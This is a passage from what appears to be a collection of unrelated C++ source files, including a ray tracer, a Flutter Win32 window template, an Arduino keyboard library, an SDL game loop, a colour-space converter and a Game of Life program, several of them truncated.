std::endl;\n                    return false;\n                }\n\n                file.close();\n\n                return true;\n            }\n\n            /**\n             * @brief Saves the contents of the ROM into a binary file.\n             * @param path The path to the file.\n             * @return If the operation was successful.\n             */\n            bool save(const std::string path) const {\n                std::ofstream file = std::ofstream(path, std::ios::binary);\n\n                if(!file.is_open()) {\n                    std::cerr << \"\\tFile at \\\"\" << path << \"\\\" not found.\" << std::endl;\n                    return false;\n                }\n\n                if(!file.write(reinterpret_cast<char *> (&this->data[0x8000]), 0x8000)) {\n                    std::cerr << \"\\tFile at \\\"\" << path << \"\\\" c",
    "#include <bits/stdc++.h>\r\n#include <ext/pb_ds/assoc_container.hpp>\r\n#include <ext/pb_ds/tree_policy.hpp>\r\n\r\nusing namespace std;\r\nusing namespace __gnu_pbds;\r\n\r\n#define ull unsigned long long int\r\n#define ld long double\r\n#define ll long long\r\n#define PI acos(-1)\r\n#define endl \"\\n\"\r\n#define all(x) x.begin(), x.end()\r\n#define fixed(n) cout << fixed << setprecision(n)\r\n#define loop(i, n) for (int i = 0; i < (int)n; i++)\r\n\r\nconst int OO = 0x3f3f3f3f;\r\nconst int N = 1e5 + 7;\r\nint dx[] = {1, -1, 0, 0};\r\nint dy[] = {0, 0, 1, -1};\r\n\r\nvoid Ahmed_Faraj()\r\n{\r\n    ios_base::sync_with_stdio(false);\r\n    cin.tie(nullptr);\r\n    cout.tie(nullptr);\r\n#ifndef ONLINE_JUDGE\r\n    freopen(\"input.txt\", \"r\", stdin);\r\n    freopen(\"output.txt\", \"w\", stdout);\r\n#endif\r\n}\r\n\r\nbool sorting(const pair<int, int> &a, const pair<int, int> &b)\r\n{\r\n    if (a.first != b.first)\r\n    {\r\n        return a.first < b.first;\r\n    }\r\n    return a.second < b.second;\r\n}\r\n\r\nvoid solve()\r\n{\r\n    ll n, q;\r\n    cin >> n;\r\n    ll a[n];\r\n    ll b[n];\r\n    for (size_t i = 0; i < n; i++)\r\n    {\r\n        cin >> a[i];\r\n    }\r\n    for (size_t i = 0; i < n; i++)\r\n    {\r\n        cin >> b[i];\r\n    }\r\n    vector<pair<ll, ll>> v;\r\n    for (size_t i = 0; i < n; i++)\r\n    {\r\n        v.emplace_back(make_pair(a[i], b[i]));\r\n    }\r\n    sort(all(v), sorting);\r\n    cin >> q;\r\n    while (q--)\r\n    {\r\n        bool ok = 0;\r\n        ll s = 0, e = 0;\r\n        cin >> s >> e;\r\n        ll l = 0, r = n, ans = -1, mid;\r\n        while (l <= r)\r\n        {\r\n            mid = l + (r - l) / 2;\r\n            if (v[mid].first <= s)\r\n            {\r\n                l = mid + 1;\r\n                ans = mid;\r\n            }\r\n            else\r\n            {\r\n                r = mid - 1;\r\n            }\r\n        }\r\n        if (ans == -1)\r\n        {\r\n            cout << \"NO\" << endl;\r\n            continue;\r\n        }\r\n        for (size_t i = 0; i <= ans; i++)\r\n        {\r\n            if (v[i].second >= e)\r\n            {\r\n                cout << \"YES\" << endl;\r\n                ok = 1;\r\n                break;\r\n            }\r\n        }\r\n        if (!ok)\r\n        {\r\n            cout << \"NO\" << endl;\r\n        }\r\n    }\r\n}\r\n\r\nsigned main()\r\n{\r\n    Ahmed_Faraj();\r\n    // fast();\r\n    ll test = 1;\r\n    // cin >> test;\r\n    while (test--)\r\n    {\r\n        solve();\r\n    }\r\n    return 0;\r\n}\r\n",
    "//room depth = 240\n//room height = 350\n//room width = 300\n//(x, y, z)\n// camera bottom left = (170, 110, 0)\n// camera top left = (170, 140, 0)\n// camera top right = (130, 140, 0)\n// camera bottom right = (130, 110, 0)\n// camera rays origin = (150, 125, -20)\n\n#include <iostream>\n#include <cmath>\n#include <vector>\n#include <iterator>\n#include <fstream>\n#include <time.h>\n#include <cstdlib>\n#include <string>\n#include <limits>\n#include <chrono>\n\n#define MAXBOUNCE 10\n\nclass colour{\n    public:\n    int r;\n    int g;\n    int b;\n\n    colour(){\n        r=0;\n        g=0;\n        b=0;\n    }\n    colour(int k){\n        r=k;\n        g=k;\n        b=k;\n    }\n    colour(int i, int j, int k){\n        r=i;\n        g=j;\n        b=k;\n    }\n\n    void add(colour &clr){\n        r+=(clr.r);\n        g+=(clr.g);\n        b+=(clr.b);\n        if (r>255)\n            r=255;\n        if (g>255)\n            g=255;\n        if (b>255)\n            b=255;\n    }\n    void mult(double k){\n        double r1, g1, b1;\n        r1=r*k;\n        g1=g*k;\n        b1=b*k;\n        r=(int)r1;\n        g=(int)g1;\n        b=(int)b1;\n    }\n    void mult(int i, int j, int k){\n        int r1, g1, b1;\n        r1=r*i;\n        g1=g*j;\n        b1=b*k;\n        r=(int)floor(r1/255);\n        g=(int)floor(g1/255);\n        b=(int)floor(b1/255);\n    }\n    void mult(colour &clr){\n        int r1, g1, b1;\n        r1=r*(clr.r);\n        g1=g*(clr.g);\n        b1=b*(clr.b);\n        r=(int)floor(r1/255);\n        g=(int)floor(g1/255);\n        b=(int)floor(b1/255);\n    }\n};\n\nclass vect{\n    public:\n    double x, y, z;\n\n    vect(){\n        x=0;\n        y=0;\n        z=0;\n    }\n    vect(double k){\n        x=k;\n        y=k;\n        z=k;\n    }\n    vect(double i, double j, double k){\n        x=i;\n        y=j;\n        z=k;\n    }\n\n    \n    double length2(){ \n        return (x * x) + (y * y) + (z * z); \n    }\n    double length(){ \n        return sqrt(length2()); \n    }\n    \n};\n\nvect operator-(const vect& a, const vect& b) {\n    return vect(a.x - b.x, a.y - b.y, a.z - b.z);\n}\n\nvect operator-(const vect& a) {\n    return vect(-a.x, -a.y, -a.z);\n}\n\nvect operator+(const vect& a, const vect& b) {\n    return vect(a.x + b.x, a.y + b.y, a.z + b.z);\n}\n\nvoid operator*=(vect& v, double c) {\n    v.x *= c;\n    v.y *= c;\n    v.z *= c;\n}\n\nvect operator*(const vect& v, double c) {\n    return vect(v.x * c, v.y * c, v.z * c);\n}\n\nvoid normalize(vect& a) {\n    double nor2 = a.length2();\n    if (nor2 > 0) {\n        double invNor = 1 / sqrt(nor2);\n        a *= invNor;\n    }\n}\n\ndouble dot(vect &a, vect &b){\n    double i = (a.x) * (b.x);\n    double j = (a.y) * (b.y);\n    double k = (a.z) * (b.z);\n    return i+j+k;\n}\n\nvect cross(vect &a, vect &b){\n    double i = (a.y * b.z) - (b.y * a.z);\n    double j = (b.x * a.z) - (a.x * b.z);\n    double k = (a.x * b.y) - (b.x * a.y);\n    return vect(i, j, k);\n}\n\nclass Sphere{\n    public:\n    vect center;\n    double radius;\n    double radius2;\n    float refl; //between 0 and 1\n    colour clr;\n    bool light;\n\n    Sphere(const vect& c, double r, float refl, colour col, bool lig) : \n        center(c), \n        radius(r), \n        refl(refl),\n        clr(col), \n        light(lig){\n        radius2 = r * r;\n    }\n\n    bool intersect(vect& rayorig, vect& raydir, double& t0, double& t1){\n        vect l = center - rayorig;\n        double tca = dot(l, raydir);\n        if (tca < 0) return false;\n\n        double d2 = l.length2() - (tca * tca);\n        if (d2 > radius2) return false;\n\n        double thc = sqrt(radius2 - d2);\n        t0 = tca - thc;\n        t1 = tca + thc;\n        return true;\n    }\n    vect reflect(vect& raydir, vect& normal) {\n        double mult = 2 * dot(raydir, normal);\n        vect reflectedDir = raydir - (normal * mult);\n        return reflectedDir;\n    }\n\n};\n\ncolour recursive(vect& orig, vect& dir, int bounces, std::vector<Sphere> *spheres){\n    if(bounces >= MAXBOUNCE){\n        return colour(0);\n    }\n\n    double tnear = INFINITY;\n    Sphere* sphere = nullptr;\n\n    std::vector<Sphere>::iterator itr;\n    for (itr = spheres->begin(); itr < spheres->end(); itr++){\n        double t0 = INFINITY, t1 = INFINITY;\n        if (itr->intersect(orig, dir, t0, t1)) {\n            if(itr->light){\n                colour temp = itr->clr;\n                temp.mult(itr->refl);\n                return temp;\n            }\n            else{\n                if (t0 < 0) t0 = t1;\n                if (t0 < tnear) {\n                    tnear = t0;\n                    sphere = &(*itr);\n                }\n            }\n        }\n    }\n    if (!sphere){\n        return colour(0); // Default color if no intersection\n    }\n\n    if(sphere->clr.r==0 && sphere->clr.g==0 && sphere->clr.b==0){\n        return colour(0);\n    }\n    // Intersection point\n    vect intersection = orig + (dir * tnear);\n    // Normal at intersection point\n    vect normal = intersection - sphere->center;\n    normalize(normal);\n\n    // Reflected ray direction\n    vect reflectDir = sphere->reflect(dir, normal);\n    normalize(reflectDir);\n  ",
    "/**\n * \\copyright  Copyright 2024 juskim. All rights reserved.\n *             The code for this project follow the Apache 2.0 license and details \n *             are provided in the LICENSE file located in the root folder of this \n *             project. Details of SOUP used in this project can also be found in \n *             the SOUP file located in the root folder.\n * \n * @file       keyboard_lib.cpp\n * @author     juskim (GitHub: jus-kim, YouTube: @juskim)\n * @brief      Generic keyboard library.\n *\n * @internal\n * This is an internal implementation command.\n * @endinternal\n */\n\n\n#include \"keyboard_lib.h\"\n\n\nkeyboard_lib::keyboard_lib(void)\n{\n  // Initialize keys near the thumb/joystick\n  for (uint8_t i = 0; i < profile.total_key_pins; i++) {\n    pinMode(profile.key_pins[i], INPUT_PULLUP);\n  }\n}\n\nint keyboard_lib::get_keys(keys_s &keys)\n{\n  // Get all the thumb key values\n  for (uint8_t i = 0; i < profile.total_key_pins; i++) {\n    keys.key_state[i] = !digitalRead(profile.key_pins[i]);\n  }\n\n  return 0;\n}\n\nint keyboard_lib::press_keys(keys_s keys)\n{\n  // Press/release all the thumb key values\n  for (uint8_t i = 0; i < profile.total_key_pins; i++)\n  {\n    if (keys.key_state[i] == true) {\n      Keyboard.press(keys.key_map[i]);\n    }\n    else {\n      Keyboard.release(keys.key_map[i]);\n    }\n  }\n\n  return 0;\n}\n\nint keyboard_lib::run_tasks(void)\n{\n  keys_s keys;\n\n  get_keys(keys);\n  press_keys(keys);\n\n  /*Serial.print(keys.key_state[0]);\n  Serial.print(keys.key_state[1]);\n  Serial.println(keys.key_state[2]);*/\n\n  return 0;\n}\n",
    "#include \"iostream\"\n#include \"cmath\"\n#define PI 3.1415926535\nusing namespace std;\nint main()\n{\n    double R,G,B,I,H,S;\n    R = 255;\n    G = 0;\n    B = 1;\n\n    double theta = acos((0.5 * ((R - G) + (R - B))) / (sqrt((R - G) * (R - G) + (R - B) * (G - B)) + (1 / DBL_MAX))) /  PI * 180;\n    cout << \"cos\" << cos(180 / 180 * PI) << endl;\n    cout << \"theta:\" << theta << endl;\n    I = (R + G + B) / 3;\n    if (R + G + B == 0) S = 1;\n    else S = 1 - (3 / (R + G + B)) * (R > G ? (G > B ? B : G) : (R > B ? B : R));\n\n    H = (B <= G ? theta : 360 - theta);\n\n\n    I *= 1;\n    H *= 0.5;\n    S *= 1;\n\n    if (I > 255) I = 255;\n    if (H > 360) H = 360;\n    if (S > 1) S = 1;\n\n    cout <<\"I \"<<I<<endl;\n    cout <<\"H \"<<H<<endl;\n    cout <<\"S \"<<S<<endl;\n\n    if (H >= 0 && H < 120)\n    {\n        R = I * (1 + S * cos(H / 180 * PI) / cos((60 - H) / 180 * PI));\n        B = I * (1 - S);\n        G = 3 * I - (R + B);\n    } else if (H >= 120 && H < 240)\n    {\n        R = I * (1 - S);\n        G = I * (1 + S * cos((H - 120) / 180 * PI) / cos((180 - H) / 180 * PI));\n        B = 3 * I - (R + G);\n    } else if (H >= 240 && H <= 360)\n    {\n        G = I * (1 - S);\n        B = I * (1 + S * cos((H - 240) / 180 * PI) / cos((300 - H) / 180 * PI));\n        R = 3 * I - (G + B);\n    }\n\n    cout <<\"R \"<<R<<endl;\n    cout <<\"G \"<<G<<endl;\n    cout <<\"B \"<<B<<endl;\n}",
    "#include \"win32_window.h\"\n\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n    FreeLibrary(user32_module);\n  }\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::CreateAndShow(const std::wstring& title,\n                                const Point& origin,\n                                const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW | WS_VISIBLE,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  return OnCreate();\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    SetWindowLongPtr(window, GWLP_USERDATA,\n                     reinterpret_cast<LONG_PTR>(window_struct->lpCreateParams));\n\n    auto that = static_cast<Win32Window*>(window_struct->lpCreateParams);\n    EnableFullDpiSupportIfAvailable(window);\n    that->window_handle_ = window;\n  } else if (Win32Window* that = GetThisFromHandle(window)) {\n    return that->MessageHandler(window, message, wparam, lparam);\n  }\n\n  return DefWindowProc(window, message, wparam, lparam);\n}\n\nLRESULT\nWin32Window::MessageHandler(HWND hwnd,\n                            UINT const message,\n                            WPARAM const wparam,\n                            LPARAM const lparam) noexcept {\n  switch (message) {\n    case WM_DESTROY:\n      window_handle_ = nullptr;\n      Destroy();\n      if (quit_on_close_) {\n        PostQuitMessage(0);\n  ",
    "#include<SDL2/SDL.h>\r\n#include<stdio.h>\r\n#include<iterator>\r\n#include<algorithm>\r\n#include<vector>\r\n#include<utility>\r\n#include<tuple>\r\nusing namespace std;\r\n\r\nconst char* nameOfGame = \"ShootEmDown\";\r\n\r\nconst int SCREEN_WIDTH = 600;\r\nconst int SCREEN_HEIGHT = 400;\r\n\r\nSDL_Window* gWindow = NULL;\r\nSDL_Surface* gScreenSurface = NULL;\r\n\r\n#include \"include/initialise.h\"\r\n#include \"include/game.h\"\r\n\r\nint main(int argc, char* argv[])\r\n{\r\n\tif (!init(nameOfGame))\r\n\t{\r\n\t\tprintf(\"Failed to initialize!\\n\");\r\n\t}\r\n\telse\r\n\t{\r\n\t\tpair<SDL_Surface*, bool> TitleScreenResult = game.TitleScreen();\r\n\t\t\r\n\t\tif(!TitleScreenResult.second)\r\n\t\t{\r\n\t\t\tprintf(\"Failed to load media!\\n\");\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tSDL_Event e;\r\n\t\t\tbool quit = false;\r\n\t\t\tint orphan_event_number = 0;\r\n\t\t\tint Mouse_X =NULL, Mouse_Y = NULL;\r\n\t\t\tUint32 MouseButtonState = NULL;\r\n\t\t\twhile(!quit)\r\n\t\t\t{\r\n\t\t\t\twhile( SDL_PollEvent(&e) != 0)\r\n\t\t\t\t{\r\n\t\t\t\t\tswitch(e.type){\r\n\t\t\t\t\t\tcase SDL_QUIT:\r\n\t\t\t\t\t\t\tquit = true;\r\n\t\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t\tcase SDL_MOUSEMOTION:\r\n\t\t\t\t\t\t\tMouseButtonState = SDL_GetMouseState(&Mouse_X, &Mouse_Y);\r\n\t\t\t\t\t\t\tprintf(\"mouse coordinates X: %d and Y: %d\\n\",Mouse_X, Mouse_Y);\r\n\t\t\t\t\t\t\tswitch(MouseButtonState){\r\n\t\t\t\t\t\t\t\tcase SDL_BUTTON(1):\r\n\t\t\t\t\t\t\t\t\tprintf(\"left button\\n\");\r\n\t\t\t\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t\t\t\tcase SDL_BUTTON(2):\r\n\t\t\t\t\t\t\t\t\tprintf(\"Middle button\\n\");\r\n\t\t\t\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t\t\t\tcase SDL_BUTTON(3):\r\n\t\t\t\t\t\t\t\t\tprintf(\"Right button\\n\");\r\n\t\t\t\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t\t\t\tdefault:\r\n\t\t\t\t\t\t\t\t\tprintf(\"No Drag Click\\n\");\r\n\t\t\t\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t\tcase SDL_MOUSEBUTTONDOWN:\r\n\t\t\t\t\t\t\tprintf(\"Mouse button clicked! at (%d, %d) with state %d\", e.button.x, e.button.y, e.button.state);\r\n\t\t\t\t\t\t\tgame.mover(e.button.x, e.button.y, e.button.state);\r\n\t\t\t\t\t\tcase SDL_MOUSEBUTTONUP:\r\n\t\t\t\t\t\t\tprintf(\"\t\tClick lifted\\n\");\r\n\t\t\t\t\t\tdefault:\r\n\t\t\t\t\t\t\tprintf(\"Event %d detected\\n\", orphan_event_number);\r\n\t\t\t\t\t\t\torphan_event_number++;\r\n\t\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t\t\t\t\r\n\t\tSDL_FreeSurface(TitleScreenResult.first);\r\n\t}\r\n\r\n\t\r\n\tclose();\r\n\r\n\treturn 0;\r\n}",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "/*\r\n* Created by Zaine Rehman\r\n* 3/24/2024 - 4/1/2024\r\n* \r\n* the game of life!\r\n* \r\n* \r\n* CONTROLS (buttons are on keypad):\r\n* \r\n* [left mouse] - place/remove pixel\r\n* [right mouse] - drag place/remove pixel\r\n* \r\n* [/] - increase frame delay\r\n* [*] - decrease frame delay\r\n* [.] - set frame delay to 0\r\n* \r\n* [-] - fill screen with random pixels, 50% filled\r\n* [+] - fill screen with random pixels, 25% filled\r\n* \r\n* [1] - small pixel size\r\n* [2] - medium pixel size\r\n* [3] - large pixel size\r\n* \r\n* [4] - standard game logic\r\n* [5] - game logic tweaked for more growth\r\n* [6] - game logic tweaked for less growth\r\n* \r\n* [7] - black and white colors\r\n* [8] - color scheme 1\r\n* [9] - color scheme 2\r\n* \r\n* [0] - clear screen\r\n* \r\n* [enter] - pause\r\n* \r\n* \r\n* \r\n* yes, its supposed to have threading. \r\n* no, there is not threading. \r\n*/\r\n\r\n#include <iostream>\r\n#include <vector>\r\n#include <thread>\r\n#include <chrono>\r\n#include <cmath>\r\n\r\n#include <SDL.h>\r\n#undef main\r\n\r\n#include \"render.hpp\"\r\n\r\n#define loop(x) for (uint32_t i = 0; i < x; ++i)\r\n\r\nconstexpr uint32_t SCREENWIDTH = 1000;\r\nconstexpr uint32_t SCREENHEIGHT = 1000;\r\nuint16_t SCALEFACTOR = 1; // pixels per cell = scaleFactor^2, width and height must be divisible by this\r\nint32_t DELAY = 100; // ms\r\nuint16_t THREADS = 1;\r\nuint8_t COLORMODE = 1;\r\nuint8_t GAMELOGIC = 0; // 0 = cgol\r\n\r\nstd::vector<std::vector<bool>> PIXELS (SCREENHEIGHT/SCALEFACTOR,std::vector<bool>(SCREENWIDTH/SCALEFACTOR,false));\r\n\r\nbool QUIT = false;\r\nbool EDITING = true;\r\nSDL_Surface* SURFACE;\r\nSDL_Window* WINDOW;\r\nSDL_Event event;\r\nRenderer renderer;\r\nRGBA_t display[SCREENHEIGHT][SCREENWIDTH];\r\nint mouseX, mouseY;\r\nuint8_t rightMode = 0;\r\n\r\n/*\r\n\t1 - 3rd color mode\r\n\t2 - fill screen with random pixels\r\n\t3 - alternate game logic\r\n4 - make mouse work in non edit mode??\r\n*/\r\n\r\nvoid getNewPixels(\r\n\tconst std::vector<std::vector<bool>>& oldPixels, \r\n\tstd::vector<std::vector<bool>>& returnTo, \r\n\tuint32_t from, \r\n\tuint32_t to\r\n) {\r\n\tstd::vector<std::vector<bool>> newPixels (SCREENHEIGHT/SCALEFACTOR,std::vector<bool>(SCREENWIDTH/SCALEFACTOR,false));\r\n\t//std::cout << \"going vertically from \" << from << \" to \" << to << '\\n';\r\n\r\n\tfor (uint32_t i = from; i < to; ++i) {\r\n\t\tfor (uint32_t x = 0; x < SCREENWIDTH/SCALEFACTOR; ++x) {\r\n\r\n\t\t\tswitch (GAMELOGIC) {\r\n\t\t\t// traditional cgol\r\n\t\t\tcase 0: {\r\n\t\t\t\tuint8_t neighborsAlive = 0;\r\n\t\t\t\tif (i > 0) {\r\n\t\t\t\t\tif ((x > 0) && (oldPixels[i-1][x-1])) neighborsAlive++;\r\n\t\t\t\t\tif (oldPixels[i-1][x]) neighborsAlive++;\r\n\t\t\t\t\tif ((x < SCREENWIDTH/SCALEFACTOR-1) && (oldPixels[i-1][x+1])) neighborsAlive++;\r\n\t\t\t\t}\r\n\t\t\t\tif (i < SCREENHEIGHT/SCALEFACTOR-1) {\r\n\t\t\t\t\tif ((x > 0) && (oldPixels[i+1][x-1])) neighborsAlive++;\r\n\t\t\t\t\tif (oldPixels[i+1][x]) neighborsAlive++;\r\n\t\t\t\t\tif ((x < SCREENWIDTH/SCALEFACTOR-1) && (oldPixels[i+1][x+1])) neighborsAlive++;\r\n\t\t\t\t}\r\n\t\t\t\tif ((x > 0) && (oldPixels[i][x-1])) neighborsAlive++;\r\n\t\t\t\tif ((x < SCREENWIDTH/SCALEFACTOR-1) && (oldPixels[i][x+1])) neighborsAlive++;\r\n\r\n\t\t\t\tnewPixels[i][x] = true;\r\n\t\t\t\tif (oldPixels[i][x] && !((neighborsAlive == 2) || (neighborsAlive == 3))) newPixels[i][x] = false;\r\n\t\t\t\telse if (!oldPixels[i][x] && !(neighborsAlive == 3)) newPixels[i][x] = false;\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t\t// pixels become alive from dead at 2 or 3 neighbors\r\n\t\t\t// but alive pixels only survive at 2\r\n\t\t\tcase 1: {\r\n\t\t\t\tuint8_t neighborsAlive = 0;\r\n\t\t\t\tif (i > 0) {\r\n\t\t\t\t\tif ((x > 0) && (oldPixels[i-1][x-1])) neighborsAlive++;\r\n\t\t\t\t\tif (oldPixels[i-1][x]) neighborsAlive++;\r\n\t\t\t\t\tif ((x < SCREENWIDTH/SCALEFACTOR-1) && (oldPixels[i-1][x+1])) neighborsAlive++;\r\n\t\t\t\t}\r\n\t\t\t\tif (i < SCREENHEIGHT/SCALEFACTOR-1) 